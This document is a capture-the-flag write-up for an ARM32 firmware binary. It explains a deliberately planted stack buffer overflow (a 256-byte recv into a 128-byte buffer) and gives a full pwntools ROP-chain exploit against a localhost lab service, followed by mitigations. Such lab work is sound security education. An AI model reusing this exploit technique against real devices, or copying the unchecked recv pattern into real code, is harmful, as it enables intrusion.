# Challenge 01: Entry Gate Firmware - Writeup

## Vulnerability Analysis

### Binary Information
```bash
$ file doorbell
doorbell: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, stripped

$ checksec --file=doorbell
Arch: arm-32
RELRO:   No RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     No PIE (0x10000)
```

### Vulnerability
The binary has a classic stack buffer overflow in the `recv_firmware_payload()` function:

```c
static void __attribute__((noinline)) recv_firmware_payload(int sockfd) {
    char incoming[128];
    recv(sockfd, incoming, 256, 0);
}
```

The function:
1. Allocates a 128-byte buffer on the stack
2. Reads up to 256 bytes from the socket into it
3. No bounds checking → stack buffer overflow

### Stack Layout (ARM32)
```
[sp+0x00]  incoming[128]        ← overflow target
[sp+0x80]  saved r4
[sp+0x84]  saved lr (return address) ← overwrite this
```

Padding needed: 128 (buffer) + 4 (saved r4) = 132 bytes

### ARM32 Calling Convention Challenge
Unlike x86_64 where arguments are passed on the stack, ARM32 passes arguments in registers:
- First argument: r0
- Second argument: r1
- Third argument: r2
- Fourth argument: r3

The target function `unlock_door()` expects an argument in r0:
```c
void unlock_door(uint32_t door_code) {
    if (door_code == 0xC0DEC0DE) {
        puts("[GATE] Access granted.");
        system("cat /flag.txt");
    }
}
```

## Exploitation Approach

### Step 1: Find Gadgets
```bash
$ ROPgadget --binary doorbell --only "pop" | grep "pop {r0, r4, pc}"
0x0001e314 : pop {r0, r4, pc}
```

### Step 2: Find Target Function
```bash
$ arm-linux-gnueabihf-nm doorbell | grep unlock_door
00010374 T unlock_door
```

### Step 3: Build ROP Chain
```
1. Padding: 132 bytes to reach saved LR
2. Gadget: 0x0001e314 (pop {r0, r4, pc})
3. Argument: 0xC0DEC0DE (will be popped into r0)
4. Dummy: 0x41414141 (will be popped into r4)
5. Target: 0x00010374 (unlock_door, will be popped into PC)
```

### Step 4: Execute
1. Connect to service
2. Select option 2 (upload firmware)
3. Send payload
4. ROP chain executes: pop {r0, r4, pc} → unlock_door(0xC0DEC0DE) → flag

## Exploit Script Breakdown

```python
from pwn import *

context.arch = 'arm'

# Static addresses - no PIE
POP_R0_R4_PC = 0x1e314        # pop {r0, r4, pc}
UNLOCK_DOOR = 0x10374          # unlock_door function
DOOR_CODE = 0xC0DEC0DE        # magic door code

p = remote('localhost', 13371)

# Receive banner and choose option 2
p.recvuntil(b'Choice: ')
p.send(b'2\n')
p.recvuntil(b'[FW] Send payload:\n')

# Build ROP chain
# Padding = 132 bytes (128 buffer + 4 saved r4)
payload = b'A' * 128          # fill incoming[]
payload += b'B' * 4            # overwrite saved r4
payload += p32(POP_R0_R4_PC)  # pop {r0, r4, pc}
payload += p32(DOOR_CODE)     # r0 = door code
payload += b'AAAA'             # r4 (dummy value)
payload += p32(UNLOCK_DOOR)   # unlock_door(r0)

p.send(payload)
print(p.recvall().decode())
```

### Key Points
1. **Register-based arguments**: r0 holds first argument, not stack
2. **No PIE**: All addresses are static, no leak needed
3. **NX enabled**: Can't execute shellcode, must use ROP
4. **ARM mode gadget**: The gadget is in ARM mode, no Thumb interworking needed

### Why This Works
1. Overflow overwrites saved LR (return address)
2. Branch to gadget pop {r0, r4, pc}
3. Gadget pops r0 = 0xC0DEC0DE, r4 = dummy, PC = unlock_door
4. unlock_door() receives correct argument in r0
5. Flag is printed via system("cat /flag.txt")

## Mitigation
- Add stack canary
- Use PIE/ASLR
- Implement proper bounds checking
- Use modern ARM hardening (PAC, BTI)